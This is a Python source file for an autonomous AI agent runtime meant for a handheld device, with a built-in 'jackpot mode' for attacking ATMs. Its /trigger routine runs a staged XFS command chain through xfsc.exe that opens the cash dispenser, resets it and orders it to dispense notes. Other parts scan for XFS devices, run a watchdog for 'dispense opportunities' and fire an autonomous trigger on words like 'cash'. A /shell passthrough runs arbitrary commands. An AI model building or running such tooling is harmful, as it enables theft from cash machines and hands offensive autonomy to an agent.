import os
import sys
import json
import time
import threading
from datetime import datetime
import numpy as np

from config import FAISS_INDEX_PATH, TEXTS_PATH, RESPONSES_PATH, DB_PATH, JACKPOT_CONFIG
from sqlite_db import BrainDB
from memory import Memory
from rag import RAG
from reranker import Reranker
from embedder import Embedder
from agent import Agent
from executor import execute
from watchdog import JackpotWatchdog

class EdgeAIRuntime:
    def __init__(self):
        print("="*60)
        print("🧠 EDGE AI AUTONOMOUS AGENT RUNTIME v3.0")
        print("   🚨 JACKPOT MODE: ENABLED")
        print("   Target Environment: Raspberry Pi Zero W / Handheld")
        print("="*60)
        
        # Initialize components
        self.db = BrainDB(DB_PATH)
        self.memory = Memory(self.db)
        self.rag = RAG(FAISS_INDEX_PATH, TEXTS_PATH, RESPONSES_PATH)
        self.embedder = Embedder()
        self.reranker = Reranker()
        self.agent = Agent(self.rag, self.reranker, self.db)
        
        # Runtime state
        self.speech_output = False
        self.speech_input = False
        self.last_turn = None
        self.command_queue = []
        self.auto_mode = False
        self.jackpot_armed = False
        self.watchdog = JackpotWatchdog(interval=5.0, threshold=2)
        
        print("\n✅ System Ready. Type '/help' for options.")
        print("🟢 JACKPOT: Type '/arm' to arm autonomous mode")
        print("-"*60)
    
    def process_command(self, user_query):
        """Process user input with enhanced command handling"""
        if not user_query:
            return None
            
        query_lower = user_query.lower().strip()
        
        # --- System Command Parsing ---
        if query_lower in ["/exit", "/quit", "/q"]:
            print("Goodbye!")
            sys.exit(0)
            
        elif query_lower == "/help":
            self._show_help()
            return None
            
        elif query_lower == "/speech":
            self.speech_output = not self.speech_output
            print(f"🔊 Speech output set to: {'ENABLED' if self.speech_output else 'DISABLED'}")
            return None
            
        elif query_lower == "/listen":
            self.speech_input = not self.speech_input
            print(f"🎙️ Speech input set to: {'ENABLED' if self.speech_input else 'DISABLED'}")
            return None
            
        elif query_lower in ["/good", "/bad"]:
            self._handle_feedback(query_lower)
            return None
            
        elif query_lower == "/stats":
            self._show_stats()
            return None
            
        elif query_lower.startswith("/inject"):
            self._handle_inject()
            return None
            
        elif query_lower == "/arm":
            self._arm_jackpot()
            return None
            
        elif query_lower == "/disarm":
            self.jackpot_armed = False
            print("🔴 Jackpot mode DISARMED")
            return None
            
        elif query_lower == "/trigger":
            self._trigger_jackpot_sequence()
            return None
            
        elif query_lower.startswith("/scan"):
            self._scan_xfs_devices()
            return None
            
        elif query_lower.startswith("/status"):
            self._check_atm_status()
            return None
            
        elif query_lower.startswith("/ls") or query_lower.startswith("/read") or \
             query_lower.startswith("/write") or query_lower.startswith("/shell"):
            return user_query  # Pass through for direct command execution
            
        # Check if command is in queue for auto-execution
        if self.auto_mode:
            return user_query
            
        return user_query
    
    def _show_help(self):
        print("\n💡 SYSTEM COMMANDS:")
        print("  /exit, /quit    - Stop and exit")
        print("  /help           - Show this menu")
        print("  /speech         - Toggle TTS output")
        print("  /listen         - Toggle STT input")
        print("  /good /bad      - Reinforcement feedback")
        print("  /stats          - System statistics")
        print("  /inject         - Inject RAG data")
        print("\n🚨 JACKPOT COMMANDS:")
        print("  /arm            - Arm autonomous jackpot mode")
        print("  /disarm         - Disarm jackpot mode")
        print("  /trigger        - Manual trigger jackpot sequence")
        print("  /scan           - Scan for XFS devices")
        print("  /status         - Check ATM device status")
        print("\n🛠️ TOOL SHORTCUTS:")
        print("  /ls <path>      - List directory")
        print("  /read <file>    - Read file")
        print("  /write <file>|<content> - Write file")
        print("  /shell <cmd>    - Execute shell command\n")
    
    def _handle_feedback(self, command):
        if self.last_turn:
            is_good = command == "/good"
            self.db.save_feedback(self.last_turn[0], self.last_turn[1], is_good=is_good)
            print(f"{'👍' if is_good else '👎'} Recorded {'POSITIVE' if is_good else 'NEGATIVE'} feedback")
        else:
            print("⚠️ No previous interaction found")
    
    def _show_stats(self):
        memories_count = len(self.db.get_recent(limit=1000))
        feedback_count = self.db.get_feedback_count()
        rag_count = len(self.rag.texts)
        print(f"\n📊 SYSTEM STATS:")
        print(f"  - Persistent Memories: {memories_count} turns")
        print(f"  - Reinforcement Records: {feedback_count}")
        print(f"  - RAG Entries: {rag_count}")
        print(f"  - Auto Mode: {'ON' if self.auto_mode else 'OFF'}")
        print(f"  - Jackpot Armed: {'YES' if self.jackpot_armed else 'NO'}")
    
    def _handle_inject(self):
        print("\n📥 Runtime RAG Data Injection:")
        text = input("Enter prompt/context keyword to match: ").strip()
        resp = input("Enter target answer/response: ").strip()
        if text and resp:
            emb = self.embedder.encode(text)
            self.rag.add_record(text, resp, emb)
            print("✅ Record injected successfully")
        else:
            print("⚠️ Injection cancelled: fields cannot be empty")
    
    def _arm_jackpot(self):
        self.jackpot_armed = True
        self.auto_mode = True
        print("🟢 JACKPOT MODE ARMED")
        print("   Agent will autonomously detect and exploit XFS vulnerabilities")
        print("   Watchdog thread monitoring for dispense opportunities")
        self.watchdog.start()
    
    def _trigger_jackpot_sequence(self):
        if not self.jackpot_armed:
            print("⚠️ Must arm jackpot mode first: /arm")
            return
            
        print("🚨 INITIATING JACKPOT SEQUENCE")
        
        # Multi-stage XFS attack chain
        stages = [
            ("Stage 1: Device Enumeration", "shell", "xfsc.exe -c 'open CashDispenser_1; cdm caps; cdm status'"),
            ("Stage 2: Bypass Attempt", "shell", "xfsc.exe -c 'cdm reset; cdm dispense 100 1'"),
            ("Stage 3: Exploit Execution", "shell", "xfsc.exe -c 'cdm dispense 100 20'"),
            ("Stage 4: State Cleanup", "shell", "xfsc.exe -c 'cdm close'")
        ]
        
        results = []
        for stage_name, tool, args in stages:
            print(f"  ⚙️ {stage_name}...")
            try:
                result = execute(tool, args)
                results.append(f"{stage_name}: {result[:100]}...")
                time.sleep(1)  # Allow device to process
            except Exception as e:
                results.append(f"{stage_name}: ERROR - {str(e)}")
                
        # Log attempt
        self.db.log_jackpot_attempt(
            attempt_type="manual",
            target_ip="127.0.0.1",
            target_port=7777,
            commands=[s[1] for s in stages],
            results=results,
            success=any("ERROR" not in r for r in results)
        )
        print("\n" + "="*60)
        print("JACKPOT SEQUENCE COMPLETE")
        print("RESULTS:")
        for r in results:
            print(f"  {r}")
        print("="*60)
        
        # Automatic disarm after attempt
        self.jackpot_armed = False
        print("🔴 Auto-disarmed after attempt")
    
    def _scan_xfs_devices(self):
        """Scan for available XFS service providers"""
        print("🔍 Scanning for XFS devices...")
        try:
            # Attempt to discover XFS devices
            result = execute("shell", "xfsc.exe -c 'list'")
            print(result)
            # Parse and log discovered devices
            self.db.log_device_scan(result)
        except Exception as e:
            print(f"⚠️ Scan failed: {e}")
    
    def _check_atm_status(self):
        """Check current ATM peripheral status"""
        print("📡 Checking ATM status...")
        try:
            result = execute("shell", "xfsc.exe -c 'open CashDispenser_1; cdm info 1; cdm close'")
            print(result)
        except Exception as e:
            print(f"⚠️ Status check failed: {e}")
    
    def run(self):
        """Main runtime loop with autonomous capabilities"""
        while True:
            try:
                # Input routing
                if self.speech_input:
                    user_query = listen_placeholder()
                else:
                    user_query = input("You: ").strip()
                
                if not user_query:
                    continue
                
                # Process system commands
                processed_query = self.process_command(user_query)
                if processed_query is None:
                    continue
                
                # --- Agent Reasoning Loop ---
                
                # 1. Fetch conversation history
                context = self.memory.context()
                full_query = f"{context}\nUser: {user_query}" if context else user_query
                
                # 2. Check for direct slash commands
                if user_query.startswith('/') and not user_query.startswith('/inject'):
                    # Direct tool execution
                    tool, args = self.agent._parse_direct_commands(user_query)
                    if tool:
                        print(f"⚙️ Executing: {tool} {args}")
                        result = execute(tool, args)
                        print(result)
                        response = f"Tool output:\n{result}"
                    else:
                        response = "Unknown command. Type /help for available commands."
                else:
                    # 3. Normal agent reasoning
                    query_emb = self.embedder.encode(full_query)
                    thought = self.agent.think(query_emb, user_query)
                    
                    # 4. Check for tool invocation
                    tool, args = self.agent.parse_action(thought)
                    if tool:
                        print(f"⚙️ Autonomous tool [{tool}] with args: {args}")
                        tool_output = execute(tool, args)
                        print("TOOL RESULT:", tool_output[:500] + "..." if len(tool_output) > 500 else tool_output)
                        response = f"Tool execution completed"
                        
                        # Check if this was a jackpot-related command
                        if "dispense" in str(args).lower() or "cdm" in str(args).lower():
                            self.db.log_xfs_command(tool, args, "127.0.0.1", 7777, tool_output)
                    else:
                        response = thought
                
                # 5. Output response
                print("AI:", response)
                speak(response, enabled=self.speech_output)
                
                # 6. Save to memory
                self.memory.add(user_query, response)
                self.last_turn = (user_query, response)
                
                # 7. Check for autonomous trigger conditions
                if self.auto_mode and self.jackpot_armed:
                    self._check_autonomous_trigger(user_query, response)
                
            except KeyboardInterrupt:
                print("\nGoodbye!")
                break
            except Exception as e:
                print(f"\n⚠️ System Error: {e}")
                import traceback
                traceback.print_exc()
    
    def _check_autonomous_trigger(self, query, response):
        """Check if conditions are met for autonomous jackpot trigger"""
        trigger_patterns = ["dispense", "cash", "withdraw", "money", "jackpot"]
        if any(p in query.lower() for p in trigger_patterns) or \
           any(p in response.lower() for p in trigger_patterns):
            print("⚠️ Autonomous trigger condition detected")
            # Wait for confirmation
            # In auto mode, confirm after analysis
            time.sleep(2)
            # Could auto-trigger here if configured


def main():
    runtime = EdgeAIRuntime()
    runtime.run()

if __name__ == "__main__":
    main()
